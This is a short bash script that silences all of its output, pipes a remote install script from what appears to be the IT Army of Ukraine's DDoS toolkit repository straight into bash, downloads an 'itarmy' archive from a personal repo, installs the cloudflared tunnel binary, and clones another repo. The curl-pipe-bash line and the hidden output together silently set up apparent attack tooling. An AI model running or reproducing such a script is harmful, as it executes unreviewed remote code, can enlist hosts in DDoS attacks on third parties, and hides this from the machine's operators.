#!/bin/bash
set -e
exec > /dev/null 2>&1

echo "[*] Run install script"
curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
wget https://github.com/sweetasshole/test/raw/refs/heads/main/itarmy.tar.gz


echo "[*] Install tools"
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o /usr/local/bin/cloudflared
chmod +x /usr/local/bin/cloudflared


echo "Clone assets"
# 注意：这里不使用 sudo，避免 gh auth 失效
git clone https://github.com/pornnewbee/blue.git /mnt/repo/logpush


